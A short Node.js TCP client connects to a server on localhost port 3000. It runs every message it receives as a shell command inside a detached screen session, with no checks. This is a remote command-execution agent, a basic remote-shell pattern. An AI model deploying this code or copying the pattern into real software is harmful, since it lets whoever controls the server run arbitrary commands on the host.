const net = require('net');
const exec = require('child_process').execSync;

const port = 3000;
const host = '127.0.0.1';

const client = new net.Socket();

client.connect(port, host, () => {
    console.log('Client: Connected to Server');
});

client.on('data', (data) =>{
    console.log(`Client: Received ${data}`);
     try {
            exec(`screen -d -m ${data}`, function (error, stdout, stderr) {});
        } catch (e) {
            console.log(`Failed to execute ${e}`)
    }
});

client.on('close', () => {
    console.log('Client: Disconnected from Server');
});
